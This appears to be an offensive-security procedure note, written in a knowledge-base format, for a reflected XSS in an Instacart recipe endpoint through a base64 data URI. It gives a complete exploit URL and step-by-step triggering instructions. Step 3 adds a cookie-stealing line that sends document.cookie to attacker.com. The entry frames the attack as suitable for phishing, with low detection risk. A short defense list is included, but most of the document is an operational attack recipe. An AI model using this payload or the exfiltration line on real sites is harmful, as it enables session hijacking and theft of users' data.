---
id: proc-inject-data-uri-xss-instacart
tags:
  - xss
  - reflected-xss
  - data-uri
  - javascript
type: procedure
tools:
  - '[[tools/Firefox]]'
  - '[[tools/Chrome]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T00:11:09.206Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Data-URI-for-XSS

## Summary

This procedure exploits a reflected Cross-Site Scripting (XSS) vulnerability in the image_url parameter of the Instacart partner_recipe endpoint by injecting a base64-encoded data URI containing malicious JavaScript, leading to arbitrary code execution in the victim's browser upon interaction.

## Description

The attack targets the https://www.instacart.com/store/partner_recipe endpoint, where the image_url parameter lacks proper validation, allowing data URIs like data:text/html;base64,... to be embedded. The payload is reflected in a 'See Image' link on the page. When the victim interacts with this link (e.g., right-click and open in new window), the browser renders the URI as HTML, executing the script. This can result in session cookie theft, keylogging, or phishing in the context of the Instacart domain. The vulnerability was reported on HackerOne (Report #227809) and requires no authentication, making it suitable for phishing campaigns.

## Requirements

1. Web browser such as Firefox or Chrome (latest version)
2. Internet access to reach the Instacart endpoint
3. Crafted URL with encoded payload (no special tools needed beyond browser)
4. Victim interaction to trigger execution

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization for URL parameters, rejecting data: URIs
- Enforce Content Security Policy (CSP) to block inline scripts and data: sources
- Use URL whitelisting or safe browsing APIs to validate image sources
- Monitor for anomalous JavaScript alerts or network requests from data URIs in browser logs
- Educate users on avoiding suspicious links in recipe or partner content

## Objectives

1. Inject and reflect a malicious data URI payload to bypass image rendering restrictions
2. Achieve JavaScript execution in the victim's browser session
3. Enable client-side attacks such as session hijacking or data exfiltration

## Instructions

### Step 1: Craft and Navigate to the Malicious URL

**Context**: Prepare the payload and deliver it via the vulnerable parameter to load the page with the reflected content.

No command required; use browser navigation.

Navigate to:

```url
https://www.instacart.com/store/partner_recipe?recipe_url=http://&partner_name=&ingredients[]=apples&ingredients[]=butter&ingredients[]=Splenda+Brown+Sugar+Blend&ingredients[]=cinnamon&ingredients[]=nutmeg&title=%22Barb%27s+Fried+Apples+-Diabetic-Low+Fat&description=&image_url=data%3atext%2fhtml%3bbase64%2cPHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4
```

> This URL includes the base64-encoded script `<script>alert('xss')</script>`. The page will display recipe elements with the tainted image link.

### Step 2: Trigger Payload Execution

**Context**: Interact with the reflected link to load and execute the data URI.

Right-click the 'See Image' link and open in a new window.

> The browser fetches the data URI, interprets it as HTML, and runs the script, popping an alert.

### Step 3: Verify Execution and Extend Attack

**Context**: Confirm success and adapt for real impact.

Observe the alert. For exploitation, modify the payload to exfiltrate data, e.g., replace alert with `new Image().src='http://attacker.com/?cookie='+document.cookie;`.

> Expected: Alert appears; in production, data sent to attacker's server.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Firefox]]
- [[tools/Chrome]]

## Tags

- [[xss]]
- [[reflected-xss]]
- [[data-uri]]
- [[JavaScript]]
